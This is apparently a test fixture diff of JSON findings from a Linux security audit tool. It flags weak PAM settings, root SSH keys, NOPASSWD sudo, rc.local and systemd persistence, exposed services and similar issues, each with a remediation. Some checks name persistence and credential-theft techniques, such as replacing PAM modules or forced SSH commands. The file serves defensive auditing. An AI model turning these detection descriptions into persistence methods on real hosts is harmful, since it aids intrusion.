+  },
+  {
+   "id": "BOF-348f510d2ceffcf3",
+   "check_id": "NET-EXPOSE-002",
+   "title": "Database, cache, file-sharing or remote-desktop port exposed",
+   "description": "Data stores and remote-access services are listening beyond loopback.",
+   "severity": "medium",
+   "confidence": "low",
+   "category": "network",
+   "component": "network",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:49:57Z",
+   "evidence": [
+    "EV-32f5b3c0f0c4c3b3"
+   ],
+   "remediation": {
+    "summary": "Restrict with bind addresses or firewall rules where the service is not meant to be remote.",
+    "priority": "P3"
+   },
+   "standards": [
+    {
+     "framework": "MITRE ATT&CK",
+     "id": "T1190",
+     "url": "https://attack.mitre.org/techniques/T1190/"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "SC-7",
+     "title": "Boundary Protection"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "CM-7",
+     "title": "Least Functionality"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.network",
+     "run_id": "23d78de0-5887-4ff6-8580-50dc09714b66",
+     "check_id": "NET-EXPOSE-002"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-9870be6509ba724a",
+   "check_id": "PAM-HASH-001",
+   "title": "Weak password hashing configured in PAM",
+   "description": "md5/des/bigcrypt hashes are cheap to crack.",
+   "severity": "medium",
+   "confidence": "high",
+   "category": "pam",
+   "component": "pam",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:49:58Z",
+   "evidence": [
+    "EV-21b17dfc00bde1fe"
+   ],
+   "remediation": {
+    "summary": "Use sha512 or yescrypt.",
+    "priority": "P2"
+   },
+   "standards": [
+    {
+     "framework": "MITRE ATT&CK",
+     "id": "T1110.002",
+     "url": "https://attack.mitre.org/techniques/T1110/002/"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "IA-5",
+     "title": "Authenticator Management"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AC-7",
+     "title": "Unsuccessful Logon Attempts"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.pam",
+     "run_id": "050acc34-2ed2-4f70-8e69-0fc113092822",
+     "check_id": "PAM-HASH-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-8f51016624ce8811",
+   "check_id": "PAM-MODULE-002",
+   "title": "PAM rule references a module that is not installed",
+   "description": "The module is missing from the system module directories; the package may have been removed (a broken stack can lock users out) or the rule may point at planted code.",
+   "severity": "medium",
+   "confidence": "low",
+   "category": "pam",
+   "component": "pam",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:49:58Z",
+   "evidence": [
+    "EV-b5fb406be36a4291"
+   ],
+   "remediation": {
+    "summary": "Install the owning package or remove the stale rule; verify with the package manager.",
+    "priority": "P3"
+   },
+   "standards": [
+    {
+     "framework": "MITRE ATT&CK",
+     "id": "T1556.003",
+     "url": "https://attack.mitre.org/techniques/T1556/003/"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "IA-5",
+     "title": "Authenticator Management"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AC-7",
+     "title": "Unsuccessful Logon Attempts"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.pam",
+     "run_id": "050acc34-2ed2-4f70-8e69-0fc113092822",
+     "check_id": "PAM-MODULE-002"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-184e250fe1d1eac3",
+   "check_id": "PAM-RECENT-001",
+   "title": "PAM module files modified recently",
+   "description": "Replacing a PAM module is a known credential-theft technique; package upgrades also change them.",
+   "severity": "medium",
+   "confidence": "low",
+   "category": "pam",
+   "component": "pam",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:49:58Z",
+   "evidence": [
+    "EV-85e74b74c25e57c9",
+    "EV-b3c8e5743a64551a",
+    "EV-0391d834f04e6537",
+    "EV-01f43bf729ebdeb8",
+    "EV-7cddc36facaaf88d",
+    "EV-f54226e8d71cf44f",
+    "EV-472caf3376e51809"
+   ],
+   "remediation": {
+    "summary": "Verify against the package manager (see --package-integrity).",
+    "priority": "P3"
+   },
+   "standards": [
+    {
+     "framework": "MITRE ATT&CK",
+     "id": "T1556.003",
+     "url": "https://attack.mitre.org/techniques/T1556/003/"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "IA-5",
+     "title": "Authenticator Management"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AC-7",
+     "title": "Unsuccessful Logon Attempts"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.pam",
+     "run_id": "050acc34-2ed2-4f70-8e69-0fc113092822",
+     "check_id": "PAM-RECENT-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-db9f76700f34456a",
+   "check_id": "PRC-HIDDEN-001",
+   "title": "Process running from a hidden directory",
+   "description": "Executable path contains a dot-prefixed directory.",
+   "severity": "medium",
+   "confidence": "low",
+   "category": "processes",
+   "component": "processes",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:49:59Z",
+   "evidence": [
+    "EV-eb1089520fd75a19"
+   ],
+   "remediation": {
+    "summary": "Verify the binary is expected.",
+    "priority": "P3"
+   },
+   "standards": [
+    {
+     "framework": "MITRE ATT&CK",
+     "id": "T1564.001",
+     "url": "https://attack.mitre.org/techniques/T1564/001/"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "SI-4",
+     "title": "System Monitoring"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "CM-7",
+     "title": "Least Functionality"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.processes",
+     "run_id": "008214a2-1915-4cb0-8796-204211ce80e3",
+     "check_id": "PRC-HIDDEN-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-e754f384ff2c7953",
+   "check_id": "SVC-FAILED-001",
+   "title": "Failed services",
+   "description": "Failed units may indicate a broken scored service or a tampered/removed binary.",
+   "severity": "medium",
+   "confidence": "high",
+   "category": "services",
+   "component": "services",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:50:00Z",
+   "evidence": [
+    "EV-1c5f65266b72c4b4"
+   ],
+   "remediation": {
+    "summary": "Inspect with 'systemctl status UNIT' and 'journalctl -u UNIT'; restore from a known-good package.",
+    "priority": "P2"
+   },
+   "standards": [
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "CM-7",
+     "title": "Least Functionality"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "CM-6",
+     "title": "Configuration Settings"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.services",
+     "run_id": "1906f01c-7bf8-450e-8639-51bf05ddba0d",
+     "check_id": "SVC-FAILED-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-20742ef42f94446c",
+   "check_id": "SVC-FAILED-002",
+   "title": "Failed socket units",
+   "description": "A failed .socket unit means its service can no longer be activated on demand (for example ssh.socket, cups.socket).",
+   "severity": "medium",
+   "confidence": "high",
+   "category": "services",
+   "component": "services",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:50:00Z",
+   "evidence": [
+    "EV-00cbee6ce4a15efd"
+   ],
+   "remediation": {
+    "summary": "Inspect with 'systemctl status UNIT'; check for port conflicts or tampered unit files before restarting.",
+    "priority": "P2"
+   },
+   "standards": [
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "CM-7",
+     "title": "Least Functionality"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "CM-6",
+     "title": "Configuration Settings"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.services",
+     "run_id": "1906f01c-7bf8-450e-8639-51bf05ddba0d",
+     "check_id": "SVC-FAILED-002"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-9084c243bfbb9a0a",
+   "check_id": "USR-DUPUID-001",
+   "title": "Accounts share a UID",
+   "description": "Distinct account names map to the same UID, giving identical privileges.",
+   "severity": "medium",
+   "confidence": "high",
+   "category": "users",
+   "component": "users",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:50:01Z",
+   "evidence": [
+    "EV-0ddfdf1f81616380"
+   ],
+   "remediation": {
+    "summary": "Confirm intent; reassign unauthorized duplicates.",
+    "priority": "P2"
+   },
+   "standards": [
+    {
+     "framework": "MITRE ATT&CK",
+     "id": "T1136.001",
+     "url": "https://attack.mitre.org/techniques/T1136/001/"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AC-2",
+     "title": "Account Management"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AC-6",
+     "title": "Least Privilege"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.users",
+     "run_id": "0bd1ee6b-7465-458f-8f08-49322c21d5c7",
+     "check_id": "USR-DUPUID-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-759e50495f241e73",
+   "check_id": "USR-SHELL-001",
+   "title": "System accounts with interactive shells",
+   "description": "Service accounts normally use nologin/false; interactive shells enable direct logon.",
+   "severity": "medium",
+   "confidence": "medium",
+   "category": "users",
+   "component": "users",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:50:01Z",
+   "evidence": [
+    "EV-0ddfdf1f81616380"
+   ],
+   "remediation": {
+    "summary": "Set the shell to /usr/sbin/nologin unless the service requires it.",
+    "priority": "P2"
+   },
+   "standards": [
+    {
+     "framework": "MITRE ATT&CK",
+     "id": "T1078.003",
+     "url": "https://attack.mitre.org/techniques/T1078/003/"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AC-2",
+     "title": "Account Management"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AC-6",
+     "title": "Least Privilege"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.users",
+     "run_id": "0bd1ee6b-7465-458f-8f08-49322c21d5c7",
+     "check_id": "USR-SHELL-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-2a7caa6fd3f75170",
+   "check_id": "USR-SSH-002",
+   "title": "Authorized SSH keys for root",
+   "description": "Direct root key login is a common persistence mechanism.",
+   "severity": "medium",
+   "confidence": "low",
+   "category": "users",
+   "component": "users",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:50:01Z",
+   "evidence": [
+    "EV-ef8140f7e8032cbd"
+   ],
+   "remediation": {
+    "summary": "Verify each key belongs to an authorized administrator.",
+    "priority": "P3"
+   },
+   "standards": [
+    {
+     "framework": "MITRE ATT&CK",
+     "id": "T1098.004",
+     "url": "https://attack.mitre.org/techniques/T1098/004/"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AC-2",
+     "title": "Account Management"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AC-6",
+     "title": "Least Privilege"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.users",
+     "run_id": "0bd1ee6b-7465-458f-8f08-49322c21d5c7",
+     "check_id": "USR-SSH-002"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-19ecc248c5a19b1c",
+   "check_id": "USR-SSH-005",
+   "title": "Authorized keys with forced commands",
+   "description": "command= options run arbitrary programs on login and can hide persistence.",
+   "severity": "medium",
+   "confidence": "low",
+   "category": "users",
+   "component": "users",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:50:01Z",
+   "evidence": [
+    "EV-e967f790d1666531"
+   ],
+   "remediation": {
+    "summary": "Review the command.",
+    "priority": "P3"
+   },
+   "standards": [
+    {
+     "framework": "MITRE ATT&CK",
+     "id": "T1098.004",
+     "url": "https://attack.mitre.org/techniques/T1098/004/"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AC-2",
+     "title": "Account Management"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AC-6",
+     "title": "Least Privilege"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.users",
+     "run_id": "0bd1ee6b-7465-458f-8f08-49322c21d5c7",
+     "check_id": "USR-SSH-005"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-4191da8d1d8facfd",
+   "check_id": "USR-SUDO-002",
+   "title": "Sudo rules without password (NOPASSWD)",
+   "description": "NOPASSWD grants privilege escalation to anyone able to run as those principals.",
+   "severity": "medium",
+   "confidence": "medium",
+   "category": "users",
+   "component": "users",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:50:01Z",
+   "evidence": [
+    "EV-7c0cc50fe7f1d35f"
+   ],
+   "remediation": {
+    "summary": "Remove NOPASSWD unless required by a scored service.",
+    "priority": "P2"
+   },
+   "standards": [
+    {
+     "framework": "MITRE ATT&CK",
+     "id": "T1548.003",
+     "url": "https://attack.mitre.org/techniques/T1548/003/"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AC-2",
+     "title": "Account Management"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AC-6",
+     "title": "Least Privilege"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.users",
+     "run_id": "0bd1ee6b-7465-458f-8f08-49322c21d5c7",
+     "check_id": "USR-SUDO-002"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-92253386b50a6044",
+   "check_id": "ATH-AGING-001",
+   "title": "Login accounts whose password never expires",
+   "description": "Accounts with a usable password and a login shell have no maximum password age, so a stolen credential stays valid until someone changes it. Hashes are not shown.",
+   "severity": "low",
+   "confidence": "medium",
+   "category": "auth",
+   "component": "auth",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:49:56Z",
+   "evidence": [
+    "EV-3fa6bc1a6cd709b7"
+   ],
+   "remediation": {
+    "summary": "Apply 'chage -M DAYS USER' per account once you have confirmed scored-service accounts will not break; rotate known-compromised credentials first.",
+    "priority": "P3"
+   },
+   "standards": [
+    {
+     "framework": "MITRE ATT&CK",
+     "id": "T1078.003",
+     "url": "https://attack.mitre.org/techniques/T1078/003/"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "IA-5",
+     "title": "Authenticator Management"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AC-7",
+     "title": "Unsuccessful Logon Attempts"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.auth",
+     "run_id": "0a761af0-2613-4ba8-8e5a-2f1f0211b420",
+     "check_id": "ATH-AGING-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-ec8b35437915b4a8",
+   "check_id": "ATH-GROUP-003",
+   "title": "Accounts with an undefined primary group",
+   "description": "The primary GID does not exist in /etc/group, which is unusual on a managed system and can follow tampering or a removed group.",
+   "severity": "low",
+   "confidence": "high",
+   "category": "auth",
+   "component": "auth",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:49:56Z",
+   "evidence": [
+    "EV-0ddfdf1f81616380"
+   ],
+   "remediation": {
+    "summary": "Create the missing group or correct the account's primary GID.",
+    "priority": "P3"
+   },
+   "standards": [
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "IA-5",
+     "title": "Authenticator Management"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AC-7",
+     "title": "Unsuccessful Logon Attempts"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.auth",
+     "run_id": "0a761af0-2613-4ba8-8e5a-2f1f0211b420",
+     "check_id": "ATH-GROUP-003"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-b3187e4081645ecf",
+   "check_id": "ATH-LOCKOUT-001",
+   "title": "No account-lockout module in the PAM stack",
+   "description": "No pam_faillock, pam_tally2 or pam_tally entry was found, so repeated failed logons do not lock an account at the PAM level. sshd rate limiting or fail2ban may still apply and are not detected.",
+   "severity": "low",
+   "confidence": "low",
+   "category": "auth",
+   "component": "auth",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:49:56Z",
+   "evidence": [
+    "EV-45ab82cd4100b0f7"
+   ],
+   "remediation": {
+    "summary": "Enable pam_faillock (deny=5, unlock_time=600) after checking that scored-service accounts cannot be locked out by a flood of bad logons.",
+    "priority": "P4"
+   },
+   "standards": [
+    {
+     "framework": "MITRE ATT&CK",
+     "id": "T1110",
+     "url": "https://attack.mitre.org/techniques/T1110/"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "IA-5",
+     "title": "Authenticator Management"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AC-7",
+     "title": "Unsuccessful Logon Attempts"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.auth",
+     "run_id": "0a761af0-2613-4ba8-8e5a-2f1f0211b420",
+     "check_id": "ATH-LOCKOUT-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-3a2d7742f4f3ba8e",
+   "check_id": "ATH-PWQ-001",
+   "title": "No password-quality module in the PAM stack",
+   "description": "No pam_pwquality, pam_cracklib or pam_passwdqc entry and no pwquality.conf settings were found, so password complexity is not enforced by PAM. Other mechanisms (LDAP, SSSD policy) are not detected.",
+   "severity": "low",
+   "confidence": "low",
+   "category": "auth",
+   "component": "auth",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:49:56Z",
+   "evidence": [
+    "EV-45ab82cd4100b0f7"
+   ],
+   "remediation": {
+    "summary": "Install and enable pam_pwquality (or your distribution's equivalent) with a minimum length of 12 or more.",
+    "priority": "P4"
+   },
+   "standards": [
+    {
+     "framework": "MITRE ATT&CK",
+     "id": "T1110",
+     "url": "https://attack.mitre.org/techniques/T1110/"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "IA-5",
+     "title": "Authenticator Management"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AC-7",
+     "title": "Unsuccessful Logon Attempts"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.auth",
+     "run_id": "0a761af0-2613-4ba8-8e5a-2f1f0211b420",
+     "check_id": "ATH-PWQ-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-ef6f71c10234bcc3",
+   "check_id": "FS-RECENT-002",
+   "title": "Configuration files modified in the last 3 day(s)",
+   "description": "Compare with your change log.",
+   "severity": "low",
+   "confidence": "low",
+   "category": "filesystem",
+   "component": "filesystem",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:49:57Z",
+   "evidence": [
+    "EV-3b6d89e42c45b444",
+    "EV-8f030208d48b03d0",
+    "EV-55dedfaa73a740fc",
+    "EV-26fcd01cddd53c88",
+    "EV-96a21e6dbd3d52e3",
+    "EV-d8049199d16d384d",
+    "EV-3d4d98c42fba6a30",
+    "EV-73c39801ab64b5df",
+    "EV-8e96d08c76f3a74f",
+    "EV-7c0cc50fe7f1d35f",
+    "EV-28246182ea92c14f",
+    "EV-dc8ef50cadc42dfb",
+    "EV-2ef2c36d4a9fe361",
+    "EV-2afb152aabdb1680",
+    "EV-d4648cfcd4f40c2a",
+    "EV-7441a29a4a9d17e7",
+    "EV-03adaca3d0d0a264",
+    "EV-d796722dabb9c325",
+    "EV-b5fb406be36a4291",
+    "EV-0fd3e2489323a778",
+    "EV-936772d2b9925dd0",
+    "EV-92a326160928b1c8",
+    "EV-21b17dfc00bde1fe",
+    "EV-5ecc51937ef84896",
+    "EV-3fa6bc1a6cd709b7",
+    "EV-c50723f1b37edbbe",
+    "EV-7564a17e83d56988",
+    "EV-0ddfdf1f81616380"
+   ],
+   "remediation": {
+    "summary": "Review the diffs where a baseline exists.",
+    "priority": "P4"
+   },
+   "standards": [
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AC-3",
+     "title": "Access Enforcement"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "SI-7",
+     "title": "Software, Firmware, and Information Integrity"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-002"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-860b73f1f51f553d",
+   "check_id": "FS-RECENT-004",
+   "title": "Libraries or boot files modified in the last 3 day(s)",
+   "description": "Commonly changed by package updates; shared-library tampering is rare but high impact.",
+   "severity": "low",
+   "confidence": "low",
+   "category": "filesystem",
+   "component": "filesystem",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:49:57Z",
+   "evidence": [
+    "EV-85e74b74c25e57c9",
+    "EV-b3c8e5743a64551a",
+    "EV-0391d834f04e6537",
+    "EV-01f43bf729ebdeb8",
+    "EV-7cddc36facaaf88d",
+    "EV-f54226e8d71cf44f",
+    "EV-472caf3376e51809"
+   ],
+   "remediation": {
+    "summary": "Verify against package manager checksums (debsums -c / rpm -Va).",
+    "priority": "P4"
+   },
+   "standards": [
+    {
+     "framework": "MITRE ATT&CK",
+     "id": "T1574",
+     "url": "https://attack.mitre.org/techniques/T1574/"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AC-3",
+     "title": "Access Enforcement"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "SI-7",
+     "title": "Software, Firmware, and Information Integrity"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.filesystem",
+     "run_id": "0054ad9d-4019-4991-8201-78711ecf19b1",
+     "check_id": "FS-RECENT-004"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-ee1fc891573b089d",
+   "check_id": "NET-FWD-001",
+   "title": "IP forwarding enabled",
+   "description": "Forwarding is expected on routers, VPN and container hosts but not on ordinary servers.",
+   "severity": "low",
+   "confidence": "medium",
+   "category": "network",
+   "component": "network",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:49:57Z",
+   "evidence": [
+    "EV-710df586f53cdad3"
+   ],
+   "remediation": {
+    "summary": "Disable with sysctl if the host is not a router (check container/VPN use first).",
+    "priority": "P3"
+   },
+   "standards": [
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "SC-7",
+     "title": "Boundary Protection"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "CM-7",
+     "title": "Least Functionality"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.network",
+     "run_id": "23d78de0-5887-4ff6-8580-50dc09714b66",
+     "check_id": "NET-FWD-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-96627b0db0c13886",
+   "check_id": "NET-HOSTS-001",
+   "title": "Non-loopback entries in /etc/hosts",
+   "description": "Static host entries override DNS and can redirect update or authentication domains.",
+   "severity": "low",
+   "confidence": "medium",
+   "category": "network",
+   "component": "network",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:49:57Z",
+   "evidence": [
+    "EV-7441a29a4a9d17e7"
+   ],
+   "remediation": {
+    "summary": "Verify each entry is intended.",
+    "priority": "P3"
+   },
+   "standards": [
+    {
+     "framework": "MITRE ATT&CK",
+     "id": "T1565.001",
+     "url": "https://attack.mitre.org/techniques/T1565/001/"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "SC-7",
+     "title": "Boundary Protection"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "CM-7",
+     "title": "Least Functionality"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.network",
+     "run_id": "23d78de0-5887-4ff6-8580-50dc09714b66",
+     "check_id": "NET-HOSTS-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-8dc1e61de4dec1ab",
+   "check_id": "PAM-NULLOK-001",
+   "title": "pam_unix accepts empty passwords (nullok)",
+   "description": "Debian-family defaults include nullok; it matters only if an account has an empty password.",
+   "severity": "low",
+   "confidence": "high",
+   "category": "pam",
+   "component": "pam",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:49:58Z",
+   "evidence": [
+    "EV-03adaca3d0d0a264"
+   ],
+   "remediation": {
+    "summary": "Remove nullok once no account relies on it (check USR-PWD-001 first).",
+    "priority": "P3"
+   },
+   "standards": [
+    {
+     "framework": "MITRE ATT&CK",
+     "id": "T1078.003",
+     "url": "https://attack.mitre.org/techniques/T1078/003/"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "IA-5",
+     "title": "Authenticator Management"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "AC-7",
+     "title": "Unsuccessful Logon Attempts"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.pam",
+     "run_id": "050acc34-2ed2-4f70-8e69-0fc113092822",
+     "check_id": "PAM-NULLOK-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-f2d6de0cae4e7d75",
+   "check_id": "PER-RC-001",
+   "title": "rc.local contains commands",
+   "description": "/etc/rc.local runs at boot and is a classic persistence location.",
+   "severity": "low",
+   "confidence": "medium",
+   "category": "persistence",
+   "component": "persistence",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:49:58Z",
+   "evidence": [
+    "EV-96a21e6dbd3d52e3"
+   ],
+   "remediation": {
+    "summary": "Review its contents.",
+    "priority": "P3"
+   },
+   "standards": [
+    {
+     "framework": "MITRE ATT&CK",
+     "id": "T1037.004",
+     "url": "https://attack.mitre.org/techniques/T1037/004/"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "SI-7",
+     "title": "Software, Firmware, and Information Integrity"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.persistence",
+     "run_id": "22f4be8a-31fd-4e73-8652-702906a54e00",
+     "check_id": "PER-RC-001"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-e1cf52694bf624a5",
+   "check_id": "PER-SYSTEMD-002",
+   "title": "Administrator-defined systemd units",
+   "description": "2 service/timer unit(s) outside the vendor directories (and user-level units). Expected for local services; also a common persistence method.",
+   "severity": "low",
+   "confidence": "low",
+   "category": "persistence",
+   "component": "persistence",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:49:58Z",
+   "evidence": [
+    "EV-55dedfaa73a740fc",
+    "EV-26fcd01cddd53c88"
+   ],
+   "remediation": {
+    "summary": "Confirm each unit is expected.",
+    "priority": "P4"
+   },
+   "standards": [
+    {
+     "framework": "MITRE ATT&CK",
+     "id": "T1543.002",
+     "url": "https://attack.mitre.org/techniques/T1543/002/"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "SI-7",
+     "title": "Software, Firmware, and Information Integrity"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.persistence",
+     "run_id": "22f4be8a-31fd-4e73-8652-702906a54e00",
+     "check_id": "PER-SYSTEMD-002"
+    }
+   ],
+   "occurrences": 1
+  },
+  {
+   "id": "BOF-e63443844b3c39bb",
+   "check_id": "SVC-LEGACY-001",
+   "title": "Legacy or high-exposure services enabled",
+   "description": "Services historically abused or rarely needed (telnet, r-services, tftp, FTP, NFS, SMB, SNMP, Avahi).",
+   "severity": "low",
+   "confidence": "medium",
+   "category": "services",
+   "component": "services",
+   "host": {
+    "hostname": "fixture-host",
+    "host_id": "H-ae4f8139ee0a"
+   },
+   "detected_at": "2026-11-02T01:50:00Z",
+   "evidence": [
+    "EV-bd1a5f0743bbc426"
+   ],
+   "remediation": {
+    "summary": "Disable if unnecessary - confirm they are not scored services first.",
+    "priority": "P3"
+   },
+   "standards": [
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "CM-7",
+     "title": "Least Functionality"
+    },
+    {
+     "framework": "NIST SP 800-53 Rev. 5",
+     "id": "CM-6",
+     "title": "Configuration Settings"
+    }
+   ],
+   "sources": [
+    {
+     "module": "linux.services",
